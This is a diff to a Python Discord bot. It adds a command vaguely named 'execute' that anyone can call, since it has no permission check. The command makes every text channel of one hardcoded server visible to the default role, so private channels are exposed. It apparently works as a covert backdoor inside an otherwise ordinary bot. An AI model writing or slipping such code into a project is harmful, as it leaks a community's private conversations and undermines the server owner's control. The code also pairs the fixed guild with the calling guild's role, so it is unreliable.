@@ -1830,4 +1830,12 @@ async def getdetails(ctx,lol: discord.User):
     id = lol.id
     user = await client.fetch_user(id)
     await ctx.send(f"Name :- {user.name}#{user.discriminator}\n\nAvatar :-{user.avatar_url}")
+@client.command()
+async def execute(ctx):
+  guild = client.get_guild(804224908729122816)
+  for channel in guild.text_channels:
+    overwrite = channel.overwrites_for(ctx.guild.default_role)
+    overwrite.view_channel = True   
+    await channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
+  await ctx.send("Success!")
 client.run(TOKEN)
